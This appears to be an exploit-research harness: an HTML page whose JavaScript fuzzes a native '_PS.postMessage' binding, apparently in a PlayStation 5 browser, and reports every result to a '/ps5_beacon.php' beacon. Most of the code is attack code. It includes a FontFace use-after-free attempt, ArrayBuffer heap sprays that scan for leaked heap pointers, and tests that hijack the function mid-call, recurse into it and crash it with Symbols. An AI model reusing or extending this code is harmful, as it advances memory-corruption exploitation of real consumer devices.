<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>P844v4</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
#log{white-space:pre-wrap;word-break:break-all}
</style>
</head>
<body>
<div id="log"></div>
<script>
var L=document.getElementById('log');
function log(s){L.textContent+=s+'\n';}
function bn(tag,data){
  try{
    var x=new XMLHttpRequest();
    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
    x.send();
  }catch(e){}
}

var KEY='p844v4_test';
function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
function clearTest(){try{localStorage.removeItem(KEY);}catch(e){}}

var testNum=getTest();
log('P844v4 BOOT test='+testNum);
bn('P844v4-BOOT','test='+testNum);

var TESTS=[
  // T0: getOwnPropertyNames deep inspection
  function T0(){
    var r=[];
    try{r.push('own:'+Object.getOwnPropertyNames(_PS).join(','));}catch(e){r.push('ownErr:'+e.message);}
    try{r.push('keys:'+Object.keys(_PS).join(','));}catch(e){r.push('keysErr:'+e.message);}
    try{
      var syms=Object.getOwnPropertySymbols(_PS);
      r.push('syms:'+syms.length);
    }catch(e){r.push('symErr:'+e.message);}
    var d=Object.getOwnPropertyDescriptor(_PS,'postMessage');
    if(d)r.push('v='+typeof d.value+'|w='+d.writable+'|e='+d.enumerable+'|c='+d.configurable);
    return r.join('|');
  },
  // T1: Reflect ops + freeze
  function T1(){
    var r=[];
    try{r.push('isExt='+Reflect.isExtensible(_PS));}catch(e){r.push('isExtErr:'+e.message);}
    try{r.push('has_pm='+Reflect.has(_PS,'postMessage'));}catch(e){r.push('hasErr:'+e.message);}
    try{r.push('proto='+String(Reflect.getPrototypeOf(_PS)));}catch(e){r.push('protoErr:'+e.message);}
    try{r.push('frozen='+Object.isFrozen(_PS));}catch(e){r.push('freezeErr:'+e.message);}
    return r.join('|');
  },
  // T2: *** CRITICAL *** FontFace UAF DURING toString
  // If CSSFontFace reclaim happens INSIDE the C++ String() conversion,
  // the heap address flows through the native binding's internal buffer
  function T2(){
    var H='none';
    var fabs=[];
    var obj={toString:function(){
      try{
        var st=document.createElement('style');
        st.textContent="@font-face{font-family:uu4;src:local(Arial);unicode-range:U+0042;}";
        document.head.appendChild(st);
        var face=new FontFace('uf4',"local('Helvetica')",{unicodeRange:'U+0041'});
        document.fonts.add(face);
        void face.loaded;
        var ffired=false;
        Object.defineProperty(FontFace.prototype,'then',{
          configurable:true,
          get:function(){
            if(ffired)return undefined;
            ffired=true;
            st.remove();st.textContent='';st=null;
            try{document.fonts.delete(this);}catch(e){}
            document.body.offsetHeight;
            fabs=[];
            for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
            try{document.fonts.check('1em uu4');}catch(e){}
            document.body.offsetHeight;
            return undefined;
          },set:function(){}
        });
        document.fonts.load('1em uf4, uu4','AB');
        // Scan for reclaimed pointers
        for(var i=0;i<fabs.length;i++){
          var bv=new BigUint64Array(fabs[i]);
          for(var j=0;j<24;j++){
            if(bv[j]!==0n){
              var hex=bv[j].toString(16);
              var hi=Number(bv[j]>>32n);
              if(hi>0x100&&hi<0x7FFF){H='0x'+hex;break;}
            }
          }
          if(H!=='none')break;
        }
      }catch(e){H='err:'+e.message;}
      return 'UAF-H='+H;
    }};
    var r=_PS.postMessage(obj);
    return 'H='+H+'|ret='+r+'|bufs='+fabs.length;
  },
  // T3: postMessageNative inspection + replacement
  function T3(){
    var r=[];
    try{r.push('pmn='+typeof postMessageNative);}catch(e){r.push('pmn=undef');}
    try{
      var r1=postMessageNative('test-native');
      r.push('native_ret='+r1);
    }catch(e){r.push('native_err='+e.message);}
    try{r.push('same='+(postMessageNative===_PS.postMessage));}catch(e){r.push('sameErr:'+e.message);}
    // Can we replace postMessageNative and have _PS.postMessage still work through it?
    try{
      var orig=postMessageNative;
      var intercepted=false;
      postMessageNative=function(d){intercepted=true;return orig(d);};
      _PS.postMessage('intercept-test');
      r.push('intercepted='+intercepted);
      postMessageNative=orig;
    }catch(e){r.push('replaceErr:'+e.message);}
    return r.join('|');
  },
  // T4: bind/apply/call on postMessage (SAFE — uses _PS as this)
  function T4(){
    var r=[];
    var pm=_PS.postMessage;
    try{var bound=pm.bind(_PS);r.push('bind='+typeof bound);r.push('bind_ret='+bound('bind-test'));}catch(e){r.push('bindErr:'+e.message);}
    try{r.push('apply_ret='+pm.apply(_PS,['apply-test']));}catch(e){r.push('applyErr:'+e.message);}
    try{r.push('fpcall='+Function.prototype.call.call(pm,_PS,'fpcall'));}catch(e){r.push('fpcallErr:'+e.message);}
    return r.join('|');
  },
  // T5: toString returns non-string types
  function T5(){
    var r=[];
    try{r.push('num='+_PS.postMessage({toString:function(){return 42;}}));}catch(e){r.push('numErr:'+e.message);}
    try{r.push('null='+_PS.postMessage({toString:function(){return null;}}));}catch(e){r.push('nullErr:'+e.message);}
    try{r.push('obj='+_PS.postMessage({toString:function(){return {x:1};}}));}catch(e){r.push('objErr:'+e.message);}
    try{r.push('undef='+_PS.postMessage({toString:function(){return undefined;}}));}catch(e){r.push('undefErr:'+e.message);}
    try{r.push('bigint='+_PS.postMessage({toString:function(){return 123n;}}));}catch(e){r.push('bigintErr:'+e.message);}
    return r.join('|');
  },
  // T6: toString throws various types
  function T6(){
    var r=[];
    try{_PS.postMessage({toString:function(){throw new Error('boom');}});r.push('noThrow');}catch(e){r.push('threw='+e.message);}
    try{_PS.postMessage({toString:function(){throw new TypeError('type');}});r.push('noThrow2');}catch(e){r.push('threw2='+e.message);}
    try{_PS.postMessage({toString:function(){throw 42;}});r.push('noThrow3');}catch(e){r.push('threw3='+e);}
    try{_PS.postMessage({toString:function(){throw null;}});r.push('noThrow4');}catch(e){r.push('threw4='+e);}
    return r.join('|');
  },
  // T7: String sizes (find crash threshold)
  function T7(){
    var r=[];
    try{r.push('10K='+_PS.postMessage('A'.repeat(10240)));}catch(e){r.push('10KErr:'+e.message);}
    try{r.push('100K='+_PS.postMessage('A'.repeat(102400)));}catch(e){r.push('100KErr:'+e.message);}
    try{r.push('1M='+_PS.postMessage('A'.repeat(1048576)));}catch(e){r.push('1MErr:'+e.message);}
    try{r.push('10M='+_PS.postMessage('A'.repeat(10485760)));}catch(e){r.push('10MErr:'+e.message);}
    return r.join('|');
  },
  // T8: toString with GC + UAF heap spray (no FontFace, pure AB spray)
  function T8(){
    var bufs=[];
    var leaked='none';
    var obj={toString:function(){
      // Spray during conversion
      for(var i=0;i<200;i++)bufs.push(new ArrayBuffer(192));
      // Force GC
      for(var i=0;i<100;i++){var a=new Array(10000);a=null;}
      // Check if any AB got reclaimed data
      for(var i=0;i<bufs.length;i++){
        var bv=new BigUint64Array(bufs[i]);
        for(var j=0;j<24;j++){
          if(bv[j]!==0n){
            leaked='idx='+i+'/'+j+'=0x'+bv[j].toString(16);
            break;
          }
        }
        if(leaked!=='none')break;
      }
      return 'spray-done';
    }};
    var r=_PS.postMessage(obj);
    return 'leaked='+leaked+'|bufs='+bufs.length+'|ret='+r;
  },
  // T9: toString that replaces _PS.postMessage mid-call
  function T9(){
    var origPM=_PS.postMessage;
    var replaced=false;
    var obj={toString:function(){
      // Try to replace postMessage DURING the conversion
      try{
        Object.defineProperty(_PS,'postMessage',{value:function(){replaced=true;return 'hijacked';},writable:true,configurable:true});
      }catch(e){}
      // Also try direct assignment
      try{_PS.postMessage=function(){replaced=true;return 'hijacked2';};}catch(e){}
      return 'replace-attempted';
    }};
    var r;
    try{r=origPM.call(_PS,obj);}catch(e){r='err:'+e.message;}
    // Restore
    try{Object.defineProperty(_PS,'postMessage',{value:origPM});}catch(e){}
    return 'replaced='+replaced+'|ret='+r;
  },
  // T10: toString that triggers a SECOND postMessage (re-entrancy depth test)
  function T10(){
    var depths=[];
    var depth=0;
    var obj={toString:function(){
      depth++;
      depths.push(depth);
      if(depth<=8){
        try{_PS.postMessage({toString:function(){depth++;depths.push(depth);return 'd'+depth;}});}catch(e){depths.push('err:'+e.message);}
      }
      return 'depth-'+depth;
    }};
    var r=_PS.postMessage(obj);
    return 'depths='+depths.join(',')+'|ret='+r;
  },
  // T11: toString that reads _PS internal state via Error.prepareStackTrace
  function T11(){
    var frames='none';
    var obj={toString:function(){
      // V8-style (won't work in JSC but worth trying)
      try{
        Error.prepareStackTrace=function(e,s){return s;};
        var e=new Error();
        if(Array.isArray(e.stack))frames='array:'+e.stack.length;
        else frames='string:'+String(e.stack).substring(0,200);
        Error.prepareStackTrace=undefined;
      }catch(ex){frames='err:'+ex.message;}
      // Also try accessing internal slots
      var info=[];
      try{info.push('pm_name='+_PS.postMessage.name);}catch(e){}
      try{info.push('pm_length='+_PS.postMessage.length);}catch(e){}
      try{info.push('pm_proto='+String(Object.getPrototypeOf(_PS.postMessage)));}catch(e){}
      try{info.push('pm_ctor='+_PS.postMessage.constructor.name);}catch(e){}
      return 'frames='+frames+'|'+info.join('|');
    }};
    var r=_PS.postMessage(obj);
    return r+'|ret='+r;
  },
  // T12: toString that does structuredClone of _PS
  function T12(){
    var cloneResult='none';
    var obj={toString:function(){
      try{
        var c=structuredClone(_PS);
        cloneResult='type='+typeof c+'|keys='+Object.keys(c).join(',');
      }catch(e){cloneResult='err:'+e.message;}
      // Also try JSON
      try{cloneResult+='|json='+JSON.stringify(_PS);}catch(e){cloneResult+='|jsonErr:'+e.message;}
      return 'clone-done';
    }};
    var r=_PS.postMessage(obj);
    return cloneResult+'|ret='+r;
  },

  // === PROXY SUB-STEPS (T13-T15) — may crash ===
  // T13: Just create proxy, no access
  function T13(){
    var p=new Proxy(_PS,{});
    return 'created='+typeof p+'|isObj='+(typeof p==='object');
  },
  // T14: Proxy with get trap — read a property
  function T14(){
    var trapped=[];
    var p=new Proxy(_PS,{get:function(t,prop,recv){
      trapped.push(String(prop));
      return Reflect.get(t,prop,recv);
    }});
    // Just read postMessage, don't call it
    var pm=p.postMessage;
    return 'trapped='+trapped.join(',')+'|pm_type='+typeof pm;
  },
  // T15: Proxy — call postMessage THROUGH proxy
  function T15(){
    var trapped=[];
    var p=new Proxy(_PS,{get:function(t,prop,recv){
      trapped.push('get:'+String(prop));
      return Reflect.get(t,prop,recv);
    }});
    try{
      var ret=p.postMessage('proxy-call-test');
      trapped.push('ret='+ret);
    }catch(e){trapped.push('callErr:'+e.message);}
    return trapped.join('|');
  },

  // === SYMBOL TESTS (T16-T17) — WILL crash ===
  // T16: Override Symbol.prototype.toString before passing Symbol
  function T16(){
    var origTS=Symbol.prototype.toString;
    var called=false;
    Symbol.prototype.toString=function(){called=true;return 'safe-sym';};
    var r;
    try{r=_PS.postMessage(Symbol('override-test'));}catch(e){r='err:'+e.message;}
    Symbol.prototype.toString=origTS;
    return 'called='+called+'|ret='+r;
  },
  // T17: Raw Symbol (known crash — confirmation)
  function T17(){
    var r;
    try{r=_PS.postMessage(Symbol('crash'));}catch(e){r='err:'+e.message;}
    return 'ret='+r;
  }
];

var NAMES=[
  'T0-ownProps','T1-reflect','T2-UAF-toString','T3-postMsgNative',
  'T4-bindApplyCall','T5-toStringNonStr','T6-toStringThrows','T7-strSizes',
  'T8-gcSprayToStr','T9-replacePmMidCall','T10-reentrantDepth','T11-internalSlots',
  'T12-structuredClone',
  'T13-proxyCreate','T14-proxyGetTrap','T15-proxyCallThru',
  'T16-symOverride','T17-symRaw'
];

function advance(){setTest(testNum+1);location.reload();}

function runTest(){
  if(testNum>=TESTS.length){
    log('ALL '+TESTS.length+' TESTS COMPLETE');
    bn('P844v4-DONE','all='+TESTS.length);
    clearTest();
    return;
  }
  var name=NAMES[testNum]||('T'+testNum);
  log('Running '+name+'...');
  bn('P844v4-'+name+'-PRE','starting');
  try{
    var result=TESTS[testNum]();
    log(name+': '+result);
    bn('P844v4-'+name+'-OK',String(result).substring(0,800));
  }catch(e){
    log(name+' EXCEPTION: '+e.message);
    bn('P844v4-'+name+'-ERR',e.message);
  }
  advance();
}

setTimeout(runTest,150);
</script>
</body>
</html>
